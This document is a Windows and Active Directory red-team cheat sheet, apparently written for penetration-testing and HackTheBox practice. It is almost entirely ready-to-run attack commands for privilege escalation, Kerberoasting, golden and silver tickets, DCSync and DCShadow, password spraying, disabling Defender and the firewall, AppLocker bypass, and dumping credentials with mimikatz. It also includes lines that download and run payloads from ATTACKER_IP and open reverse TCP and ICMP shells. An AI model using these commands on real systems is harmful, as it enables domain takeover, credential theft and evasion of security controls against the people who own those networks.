For fancy graphics
<https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/>

# &nbsp;&nbsp;&nbsp;&nbsp; Recon

<pre class="prettyprint linenums:"><code class="language-py"># Systeminfo
systeminfo
hostname 

# Especially good with hotfix info
wmic qfe get Caption,Description,HotFixID,InstalledOn

# What users/localgroups are on the machine?
net users
net localgroups
net localgroup Administrators
net user morph3

# Crosscheck local and domain too
net user morph3 /domain
net group Administrators /domain

# Network information
ipconfig /all
route print
arp -A

# To see what tokens we have 
whoami /priv

# Recursive string scan
findstr /spin "password" *.*

# Running processes
tasklist /SVC

# Network connections
netstat -ano

# Search for writeable directories
dir /a-r-d /s /b

### Some good one-liners

# Obtain the path of the executable called by a Windows service (good for checking Unquoted Paths):
sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul
</code></pre>

# Elevation of Privileges

## &nbsp;&nbsp;&nbsp;&nbsp; General 
<pre class="prettyprint linenums:"><code class="language-py"># PowerShellMafia
# Use always dev branch others are shit.
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
powershell.exe -c "Import-Module C:\Users\Public\PowerUp.ps1; Invoke-AllChecks"
powershell.exe -c "Import-Module C:\Users\Public\Get-System.ps1; Get-System"

# Sherlock
https://github.com/rasta-mouse/Sherlock

# Unquoted paths
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v 
</code></pre>
## &nbsp;&nbsp;&nbsp;&nbsp; Kerberoast 

<!-- more -->
Simple logic for kerberoast is requesting tickets and cracking them(offline, doesn't produce any logs) 
-- For kerberos to work, times have to be within 5 minutes between attacker and victim.
<pre class="prettyprint linenums:"><code class="language-py"># Rubeus 
.\.rubeus.exe kerberoast /creduser:ecorp\morph3 /credpassword:pass1234

# List available tickets
setspn.exe -t evil.corp -q */*
powershell.exe -exec bypass -c "Import-Module .\GetUserSPNs.ps1"
cscript.exe GetUserSPNs.ps1

# List cached tickets
Invoke-Mimikatz -Command '"kerberos::list"'
powershell.exe -c "klist"
powershell.exe -c "Import-Module C:\Users\Public\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"kerberos::list"'"

# Request tickets 
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"

# Requesting remotely
python GetUserSPNs.py -request ECORP/morph3:supersecurepassword@127.0.0.1

# Extract tickets
powershell.exe -c "Import-Module C:\Users\Public\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack Tickets
python tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Juicy Potato
https://github.com/ohpe/juicy-potato/releases
Pick one CLSID from here according to your system
https://github.com/ohpe/juicy-potato/tree/master/CLSID

Required tokens
SeAssignPrimaryTokenPrivilege 
SeImpersonatePrivilege 

<pre class="prettyprint linenums:"><code class="language-py">C:\Windows\Temp\JuicyPotato.exe -p cmd.exe -a "/c whoami > C:\Users\Public\morph3.txt" -t * -l 1031 -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp;  Stored Credential
<pre class="prettyprint linenums:"><code class="language-ps"># To check if there is any stored keyscmdkey /list

# Using them
runas /user:administrator /savecred "cmd.exe /k whoami"
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp;  Impersonating Tokens with meterpreter
<pre class="prettyprint linenums:"><code class="language-ps">use incognito
list_tokens -u
impersonate_token NT-AUTHORITY\System
</code></pre>


# Lateral Movement
PsExec, SmbExec, WMIExec, RDP, PTH in general.
WinRM is always good. Check groups carefully.
Since windows gave support to OpenSSH we should also consider SSH.
## &nbsp;&nbsp;&nbsp;&nbsp; Mimikatz Ticket PTH
<pre class="prettyprint linenums:"><code class="language-py">Enable-PSRemoting
mimikatz.exe '" kerberos:ptt C:\Users\Public\ticketname.kirbi"' "exit"
Enter-PSSession -ComputerName ECORP
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; WinRM

<pre class="prettyprint linenums:"><code class="language-powershell">$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass)
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }

# Evil-WinRM
https://github.com/Hackplayers/evil-winrm
ruby evil-winrm.rb -i 192.168.1.2 -u morph3 -p morph3 -r evil.corp
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; PTH with Mimikatz
<pre class="prettyprint linenums:"><code class="language-powershell">Invoke-Mimikatz -Command '"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command"'
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Database Links
<pre class="prettyprint linenums:"><code class="language-py"># PowerUpSQL
https://github.com/NetSPI/PowerUpSQL

Get-SQLServerLink -Instance server -Verbose
powershell.exe -c "Import-Module C:\Users\Public\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\sql"

# To see servers 
select srvname from master..sysservers;

# Native
Get-SQLServerLinkCrawl -Instance server -Query "exec master..xp_cmdshell 'whoami'"

# Linked database tables
select * from openquery("ECORP\FOO", 'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES') 

# You can also use meterpreter module exploit/windows/mssql/mssql_linkcrawler
# With meterpreter module you can find linked databases and if you are admin on them

# You can do a query and try to enable xp_cmpshell on that server
select * from openquery("server",'select * from master..sysservers') EXECUTE AS USER = 'internal_user' ('sp_configure "xp_cmdshell",1;reconfigure;') AT "server"
</code></pre>


# Golden and Silver Tickets

Keys depend of ticket :
--> for a Golden, they are from the krbtgt account;
--> for a Silver, it comes from the "computer account" or "service account".

<pre class="prettyprint linenums:"><code class="language-py"># Golden Ticket
# Extract the hash of the krbtgt user
lsadump::dcsync /domain:evil.corp /user:krbtgt
lsadump::lsa /inject
lsadump:::lsa /patch
lsadump::trust /patch

# creating the ticket 
# /rc4 or /krbtgt - the NTLM hash
# /sid you will get this from krbtgt dump
# /ticket parameter is optional but default is ticket.kirbi
# /groups parameter is optional but default is 513,512,520,518,519
# /id you can fake users and supply valid Administrator id 

kerberos::golden /user:morph3 /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519 
kerberos::ptt golden.tck # you can also add /ptt at the kerberos::golden command
# After this , final ticket must be ready

# You can now verify that your ticket is in your cache 
powershell.exe -c "klist"
# Verify that golden ticket is working
dir \\DC\C$
psexec.exe \\DC cmd.exe

# Purge the currently cached kerberos ticket
kerberos::purge 

#metasploit module can also be used for golden ticket, it loads the ticket into given session
post/windows/escalate/golden_ticket 

# Silver Ticket
# Silver Ticket allows escalation of privileges on DC
# /target t he server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)
# /service - The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)

# Examples
kerberos::golden /user:morph3 /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103
sqlcmd -S evilcorp-sql102.evilcorp.local
select SYSTEM_USER;
GO

kerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt
</code></pre>


# AD Attacks
##  &nbsp;&nbsp;&nbsp;&nbsp; Enumeration
<pre class="prettyprint linenums:"><code class="language-py"># Basic ldap enumeration
enum4linux -a 192.168.1.2
python windapsearch.py -u morph3 -p morph3 -d evil.corp --dc-ip 192.168.1.2
python ad-ldap-enum.py -d contoso.com -l 10.0.0.1 -u Administrator -p P@ssw0rd
</code></pre>

##  &nbsp;&nbsp;&nbsp;&nbsp; Bruteforce on ldap
<pre class="prettyprint linenums:"><code class="language-py"># Password spray
https://github.com/dafthack/DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

# Password brute
./kerbrute_linux_amd64 bruteuser -d evil.corp --dc 192.168.1.2 rockyou.txt morph3

# Username brute
./kerbrute_linux_amd64 userenum -d evil.corp --dc 192.168.1.2 users.txt

# Password spray
./kerbrute_linux_amd64 passwordspray -d evil.corp --dc 192.168.1.2 users.txt rockyou.txt
</code></pre>


</code></pre>
##  &nbsp;&nbsp;&nbsp;&nbsp; DC Shadow

DC Shadow attack aims to inject malicious Domain Controlllers into AD infrastructure so that we can dump actual AD members.
![](/images/dcshadow.png)

<pre class="prettyprint linenums:"><code class="language-py">#Find sid for that user
wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid

#This will create a RPC Server and listen
lsadump::dcshadow /object:"CN=morph3,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local" /attribute:sidhistory /value:sid

# Run this from another mimikatz
lsadump::dcshadow /push

# After this unregistration must be done
# Relogin

lsadump::dcsync /domain:ECORP.local /account:krbtgt

# Now you must have krbtgt hash

https://attack.stealthbits.com/how-dcshadow-persistence-attack-works
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; DC Sync
<pre class="prettyprint linenums:"><code class="language-py">#####
lsadump::dcsync /domain:domain /all /csv
lsadump::dcsync /user:krbtgt

#####
https://gist.github.com/monoxgas/9d238accd969550136db
powershell.exe -c "Import-Module .\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat"

#####
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
python secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL
</code></pre>


# Bypass-Evasion Techniques
## &nbsp;&nbsp;&nbsp;&nbsp; Powershell Constrained Language Bypass
<pre class="prettyprint linenums:"><code class="language-py">powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')

PSByPassCLM
powershell.exe -exec bypass -c
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Windows Defender
<pre class="prettyprint linenums:"><code class="language-powershell">sc config WinDefend start= disabled
sc stop WinDefend
# Powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Remove definitions
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
</code></pre>
## &nbsp;&nbsp;&nbsp;&nbsp; Firewall
<pre class="prettyprint linenums:"><code class="language-powershell">Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Ip Whitelisting
<pre class="prettyprint linenums:"><code class="language-powershell">New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Applocker ByPass 
<pre class="prettyprint linenums:"><code class="language-py">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md

# Multistep process to bypass applocker via MSBuild.exe:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.56 LPORT=9001  -f csharp -e x86/shikata_ga_nai -i <n-iterations> > out.cs 

# Replace the buf-sc and save it as out.csproj
https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml

Invoke-WebRequest "http://ATTACKER_IP/payload.csproj" -OutFile "out.csproj"; C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\out.csproj

# or you can simply use my tool :)
https://github.com/morph3/Msbuild-payload-generator
sudo python msbuild_gen.py -a x86 -i 10 --lhost 192.168.220.130 --lport 9001 -m
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; GreatSCT 
<pre class="prettyprint linenums:"><code class="language-powershell"># This also needs Veil-Framework
python GreatSCT.py --ip 192.168.1.56 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload1.exe

python3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip 192.168.1.56 --port 9001
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; EvilSalsa
<pre class="prettyprint linenums:"><code class="language-powershell">#Preparing payloads
python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
EncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt

#Executing payload
SalseoLoader.exe password http://ATTACKER_IP/evilsalsa.dll.txt reversetcp ATTACKER_IP 9001

# Reverse icmp shell
python icmpsh_m.py "ATTACKER_IP" "VICTIM_IP"
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IP
</code></pre>


# Miscellaneous
## &nbsp;&nbsp;&nbsp;&nbsp; Changing Permissions of a file
<pre class="prettyprint linenums:"><code class="language-powershell">icacls text.txt /grant Everyone:F
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Downloading files 
<pre class="prettyprint linenums:"><code class="language-powershell">IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")
(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")  
Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"  

certutil.exe -urlcache -split -f "http://127.0.0.1:80/shell.exe" shell.exe
</code></pre>

## &nbsp;&nbsp;&nbsp;&nbsp; Adding user to Domain admins
<pre class="prettyprint linenums:"><code class="language-powershell">Add-DomainGroupMember -Identity 'Domain Admins' -Members morph3 -Verbose
</code></pre>
##  &nbsp; &nbsp;&nbsp;&nbsp; Base64 Encode-Decode
<pre class="prettyprint linenums:"><code class="language-powershell">certutil -decode foo.b64 foo.exe
certutil -encode foo.exe foo.b64
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Network sharing
<pre class="prettyprint linenums:"><code class="language-powershell"># Local share
net share
wmic share get /format:list

# Remote share
net view
net view \\dc.ecorp.foo /all
wmic /node: dc.ecorp.foo share get

# Mounting share
net use Z: \\127.0.0.1\C$ /user:morph3 password123
</code></pre>


## &nbsp; &nbsp;&nbsp;&nbsp; Port Forwarding
<pre class="prettyprint linenums:"><code class="language-powershell"># Port forward using plink
plink.exe -l morph3 -pw pass123 192.168.1.56 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l attacker-port -p victim-port -r victim-ip
portfwd add -l 3306 -p 3306 -r 192.168.1.56
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Powershell Portscan
<pre class="prettyprint linenums:"><code class="language-powershell">0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(VICTIM_IP,$_)) "Port $_ is open!"} 2>$null
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Recovering Powershell Secure String
<pre class="prettyprint linenums:"><code class="language-powershell">######
$user = "morph3"
$file = "morph3-pass.xml"
$cred= New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, (Get-Content $file | ConvertTo-SecureString)
Invoke-Command -ComputerName ECORP -Credential $cred -Authentication credssp -ScriptBlock { whoami }

######
[System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR("string"))

######
$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
$result 
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Injecting PowerShell scripts Into sessions
<pre class="prettyprint linenums:"><code class="language-powershell">Invoke-Command -FilePath scriptname -Sessions $sessions
Enter-PSSession -Session $sess
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Enable RDP

<pre class="prettyprint linenums:"><code class="language-py"># CMD 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Optional
net localgroup "Remote Desktop Users" morph3 /add

# Reruling firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Decrypting EFS files with Mimikatz
Follow the link here [How to Decrypt EFS Files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

<pre class="prettyprint linenums:"><code class="language-py">privilege::debug 
token::elevate 
crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\thecert" /export

dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id"

# Clear text password 
dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\SID\masterkey" /password:pass123

# After this command you must have the exported .der and .pvk files
dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b

openssl x509 -inform DER -outform PEM -in blah.der -out public.pem

openssl rsa -inform PVK -outform PEM -in blah.pvk -out private.pem

openssl pkcs12 -in public.pem -inkey private.pem -password pass:randompass -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Import the certificate
certutil -user -p randompass -importpfx cert.pfx NoChain,NoRoot

type "C:\Users\Administrator\Documents\encrypted.txt"
</code></pre>


# Post exploitation - information gathering

## &nbsp; &nbsp;&nbsp;&nbsp; Reading Event Logs

User must be in "Event Log Reader" group
[Follow this link](https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/)

<pre class="prettyprint linenums:"><code class="language-powershell">Get-WinEvent -ListLog *

# Listing logs of a specific user
$cred = Get-Credentials
Get -WinEvent -ListLog * -ComputerName AD1 -Credentials $cred

# Reading Security logs
(Get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessNam
e';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={
$_.Properties[8].Value }}).commandline
</code></pre>


## &nbsp; &nbsp;&nbsp;&nbsp; Password Dump
<pre class="prettyprint linenums:"><code class="language-powershell"># Metasploit
post/windows/gather/enum_chrome
post/multi/gather/firefox_creds
post/firefox/gather/cookies
post/firefox/gather/passwords
post/windows/gather/forensics/browser_history
post/windows/gather/enum_putty_saved_sessions

# Empire
collection/ChromeDump
collection/FoxDump
collection/netripper
credentials/sessiongopher

# mimikatz
privilege::debug
sekurlsa::logonpasswords
</code></pre>

## &nbsp; &nbsp;&nbsp;&nbsp; Shadow copy
There might be a case where you are privileged but can't read-access to shadow files(NTDS.dit, SYSTEM etc.)
<pre class="prettyprint linenums:"><code class="language-cmd">diskshadow.exe
set context persistent nowriters
add volume C: alias morph3
create
expose %morph3% Z:

# Deletion
delete shadows volume %morph3%
reset
</code></pre>


## &nbsp; &nbsp;&nbsp;&nbsp; NTDS.dit dump
<pre class="prettyprint linenums:"><code class="language-powershell">secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result local

python crackmapexec.py 192.168.1.56 -u morph3 -p pass1234 -d evilcorp.com --ntds drsuapi

# on DC, lsass.exe can dump hashes
lsadump::lsa /inject
</code></pre>




# Summary of tools

## &nbsp; &nbsp;&nbsp;&nbsp; Ad Environment
[icebreaker](https://github.com/DanMcInerney/icebreaker)
[bloodhound](https://github.com/BloodHoundAD/BloodHound)

## &nbsp; &nbsp;&nbsp;&nbsp;  Post Exploitation
[Empire](https://github.com/EmpireProject/Empire)
[DeathStar](https://github.com/byt3bl33d3r/DeathStar)
[CrackMapExec - CME](https://github.com/byt3bl33d3r/CrackMapExec)
[Covenant](https://github.com/cobbr/Covenant)
[Rubeus](https://github.com/GhostPack/Rubeus)
[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

## &nbsp; &nbsp;&nbsp;&nbsp; Bypass
[Ebowla](https://github.com/Genetic-Malware/Ebowla)
[Veil-Framework](https://github.com/Veil-Framework/Veil)
[PsBypassCLM](https://github.com/padovah4ck/PSByPassCLM)

## &nbsp; &nbsp;&nbsp;&nbsp; Swiss Knife
[impacket](https://github.com/SecureAuthCorp/impacket)


# Credits
Thanks to [HTB](http://hackthebox.eu/) for creating such a great platform.
Special thanks to [Layle](https://twitter.com/layle_ctf) and [xct](https://twitter.com/xct_de) they helped me in countless topics. Learned so much from them.
